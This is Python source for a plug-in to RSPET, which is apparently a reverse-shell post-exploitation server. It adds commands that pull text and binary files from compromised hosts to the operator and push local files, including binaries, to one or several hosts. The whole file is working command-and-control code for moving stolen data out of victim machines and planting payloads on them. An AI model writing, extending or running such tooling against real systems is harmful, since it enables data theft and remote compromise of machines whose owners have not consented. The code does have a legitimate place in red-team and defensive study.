"""
Plug-in module for RSPET server. Offer remote file inclusion functions.
"""
from __future__ import print_function
from socket import error as sock_error
from Plugins.mount import Plugin


class Files(Plugin):
    """
    Class expanding Plugin.
    """
    __server_commands__ = {}
    __cmd_help__ = {}

    def __init__(self):
        """
        Declare plugin's CLI commands their syntax and their scope.
        """
        self.__server_commands__["Pull_File"] = [self.pull_file, "connected"]
        self.__cmd_help__["Pull_File"] = "Pull_File <remote_file> [local_file]"
        self.__server_commands__["Pull_Binary"] = [self.pull_binary, "connected"]
        self.__cmd_help__["Pull_Binary"] = "Pull_Binary <remote_bin> [local_bin]"
        self.__server_commands__["Make_File"] = [self.make_file, "connected",
                                               "multiple"]
        self.__cmd_help__["Make_File"] = "Make_File <local_file> [remote_file]"
        self.__server_commands__["Make_Binary"] = [self.make_binary, "connected",
                                                 "multiple"]
        self.__cmd_help__["Make_Binary"] = "Make_Binary <local_bin> [remote_bin]"

    def pull_file(self, server, args):
        """Pull a regular text file from the host."""
        ret = [None,0,""]
        host = server.get_selected()[0]
        if len(args) == 0:
            ret[2] = ("Syntax : %s" % self.__cmd_help__["Pull_File"])
            ret[1] = 1 # Invalid Syntax Error Code
        else:
            remote_file = args[0]
            try:
                local_file = args[1]
            except IndexError:
                local_file = remote_file
            try:
                host.send(host.command_dict['sendFile'])
                host.send("%03d" % len(remote_file))
                host.send(remote_file)
            except sock_error:
                ret[0] = "basic"
                ret[1] = 2 # Socket Error Code
            else:
                try:
                    if host.recv(3) == "fna": # recv can raise sock_error
                        ret[2] += "File does not exist or Access Denied"
                        ret[1] = 4 # Remote Access Denied Error Code
                    else:
                        try:
                            with open(local_file, "w") as file_obj:
                                filesize = int(host.recv(13))
                                file_obj.write(host.recv(filesize))
                        except IOError:
                            ret[2] += "Cannot create local file"
                            ret[1] = 3 # Local Access Denied Error Code
                except sock_error:
                    ret[0] = "basic"
                    ret[1] = 2 # Socket Error Code
        return ret

    def pull_binary(self, server, args):
        """Pull a binary file from the host."""
        ret = [None,0,""]
        host = server.get_selected()[0]
        if len(args) == 0:
            ret[2] = ("Syntax : %s" % self.__cmd_help__["Pull_Binary"])
            ret[1] = 1 # Invalid Syntax Error Code
        else:
            remote_file = args[0]
            try:
                local_file = args[1]
            except IndexError:
                local_file = remote_file
            try:
                host.send(host.command_dict['sendBinary'])
                host.send("%03d" % len(remote_file))
                host.send(remote_file)
            except sock_error:
                ret[0] = "basic"
                ret[1] = 2 # Socket Error Code
            else:
                try:
                    if host.recv(3) == "fna": # recv can raise sock_error
                        ret[2] += "File does not exist or Access Denied"
                        ret[1] = 4 # Remote Access Denied Error Code
                    else:
                        try:
                            with open(local_file, "wb") as file_obj:
                                filesize = int(host.recv(13))
                                file_obj.write(host.recv(filesize))
                        except IOError:
                            ret[2] += "Cannot create local file"
                            ret[1] = 3 # Local Access Denied Error Code
                except sock_error:
                    ret[0] = "basic"
                    ret[1] = 2 # Socket Error Code
        return ret

    def make_file(self, server, args):
        """Send a regular text file to the host(s)."""
        ret = [None,0,""]
        hosts = server.get_selected()
        if len(args) == 0:
            ret[2] = ("Syntax : %s" % self.__cmd_help__["Make_File"])
            ret[1] = 1 # Invalid Syntax Error Code
        else:
            local_file = args[0]
            try:
                remote_file = args[1]
            except IndexError:
                remote_file = local_file.split("/")[-1]
            for host in hosts:
                try:
                    host.send(host.command_dict['getFile'])
                    host.send("%03d" % len(remote_file))
                    host.send(remote_file)
                except sock_error:
                    ret[0] = "basic"
                    ret[1] = 2 # Socket Error Code
                except ValueError:
                    ret[1] = 3 # LocalAccessError Code
                    ret[2] += "File not found!"
                else:
                    try:
                        if host.recv(3) == "fna":
                            ret[2] += "Access Denied"
                            ret[1] = 4 # Remote Access Denied Error Code
                        else:
                            with open(local_file) as file_obj:
                                contents = file_obj.read()
                                host.send("%013d" % len(contents))
                                host.send(contents)
                                host.recv(3) #For future use?
                    except sock_error:
                        ret[0] = "basic"
                        ret[1] = 2 # Socket Error Code
        return ret

    def make_binary(self, server, args):
        """Send a binary file to the host(s)."""
        ret = [None,0,""]
        hosts = server.get_selected()
        if len(args) == 0:
            ret[2] = ("Syntax : %s" % self.__cmd_help__["Make_Binary"])
            ret[1] = 1 # Invalid Syntax Error Code
        else:
            local_file = args[0]
            try:
                remote_file = args[1]
            except IndexError:
                remote_file = local_file.split("/")[-1]
            for host in hosts:
                try:
                    host.send(host.command_dict['getBinary'])
                    host.send("%03d" % len(remote_file))
                    host.send(remote_file)
                except sock_error:
                    ret[0] = "basic"
                    ret[1] = 2 # Socket Error Code
                except ValueError:
                    ret[1] = 3 # LocalAccessError Code
                    ret[2] += "File not found!"
                else:
                    try:
                        if host.recv(3) == "fna":
                            ret[2] += "Access Denied"
                            ret[1] = 4 # Remote Access Denied Error Code
                        else:
                            with open(local_file, "rb") as file_obj:
                                contents = file_obj.read()
                                host.send("%013d" % len(contents))
                                host.send(contents)
                                host.recv(3) # For future use?
                    except sock_error:
                        ret[0] = "basic"
                        ret[1] = 2 # Socket Error Code
        return ret
